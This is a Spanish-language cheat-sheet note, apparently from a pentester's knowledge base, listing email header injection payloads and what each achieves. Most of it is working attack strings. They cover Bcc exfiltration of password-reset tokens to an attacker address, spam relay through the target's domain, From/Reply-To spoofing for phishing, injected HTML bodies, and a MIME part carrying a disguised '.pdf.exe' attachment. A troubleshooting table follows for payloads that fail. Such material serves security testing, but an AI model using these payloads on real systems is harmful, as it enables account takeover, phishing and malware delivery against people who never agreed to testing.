---
tipo: meta
aliases:
  - payloads de correo
  - Bcc exfil
  - From spoofing payloads
tags:
  - meta/referencia
  - dominio/web
---

# Email header impacto - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué inyectar una vez que el `\r\n` pasa al correo. Cómo hacerlo pasar está en [[Email header inyección - matriz de referencia]]; el criterio, en las dos notas de `600-tradecraft/`.

Todos los payloads llevan el `\r\n` como `%0d%0a`; ajustar la codificación según [[Email header inyección - matriz de referencia]] § 4.

## 1. Exfiltrar un correo de restablecimiento

Ver [[Email header - inyección de destinatarios]]. En el flujo de reset:

```
email = victima@objetivo.com%0d%0aBcc: atacante@evil.com
```

El atacante recibe una copia del correo de reset de la víctima, con su token. La víctima recibe el suyo normal y no nota nada.

## 2. Relay de spam

Destinatarios masivos desde el dominio legítimo:

```
email = x@x.com%0d%0aBcc: v1@a.com,v2@b.com,v3@c.com
```

El spam sale con la reputación del dominio del objetivo, así que pasa filtros que rechazarían un dominio nuevo. Impacto: abuso del servidor de correo, no toma de cuenta.

## 3. Falsificar el remitente

Ver [[Email header - falsificación y cuerpo]]. Phishing con la identidad del objetivo:

```
email = x%0d%0aFrom: soporte@objetivo.com%0d%0aReply-To: atacante@evil.com
```

El `From` prestado hace el phishing creíble; el `Reply-To` desvía las respuestas.

> [!warning] SPF/DKIM/DMARC pueden anularlo
> Si el dominio del objetivo firma sus correos y el servidor de envío no está autorizado, el `From` falso termina en spam o rechazado. Verificar antes de vender el hallazgo como phishing efectivo.

## 4. Reescribir el cuerpo

El doble `\r\n` cierra las cabeceras y empieza el cuerpo:

```
email = x%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Actualizá tu cuenta</h1><a href=https://atacante.com>acá</a>
```

El destinatario ve HTML controlado dentro de un correo legítimo del objetivo. Es phishing con el dominio prestado y el cuerpo prestado.

## 5. Inyección de partes MIME

Con `MIME-Version` y `Content-Type: multipart`, inyectar un adjunto o un cuerpo alternativo:

```
email = x%0d%0aMIME-Version: 1.0%0d%0aContent-Type: multipart/mixed; boundary="X"%0d%0a%0d%0a--X%0d%0aContent-Type: text/html%0d%0a%0d%0a<phishing>%0d%0a--X%0d%0aContent-Type: application/octet-stream; name="factura.pdf.exe"%0d%0a...
```

Un cuerpo alternativo `text/plain` inofensivo con un `text/html` malicioso evade filtros que solo miran la parte de texto.

## 6. Cambiar el asunto

```
email = x%0d%0aSubject: Restablecé tu contraseña acá
```

Si el `Subject` original se anexa después, se puede reescribir para que el correo parezca otra cosa.

## 7. Qué apuntar, en orden de impacto

| Objetivo | Payload | Impacto |
|---|---|---|
| `Bcc` en flujo de reset | § 1 | Exfil de token → toma de cuenta |
| `From` + cuerpo | § 3 + § 4 | Phishing con identidad prestada |
| MIME con adjunto | § 5 | Malware que evade filtros |
| `Bcc` masivo | § 2 | Relay de spam |

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El `Bcc` no llega | Ver [[Email header inyección - matriz de referencia]] § 7 |
| El cuerpo inyectado no se ve | Falta el doble `\r\n` o el `Content-Type` |
| El `From` falso va a spam | SPF/DKIM/DMARC del objetivo; sigue siendo hallazgo, menor impacto |
| El MIME no arma el adjunto | Boundary mal cerrado; revisar los `--X` |
| El asunto no cambia | Se fija del lado del servidor; probar otra cabecera |

## Relacionadas

[[MOC - Email header injection]] · [[Email header inyección - matriz de referencia]] · [[CRLF impacto - matriz de referencia]] · [[Autenticación - abuso de recuperación de contraseña]]
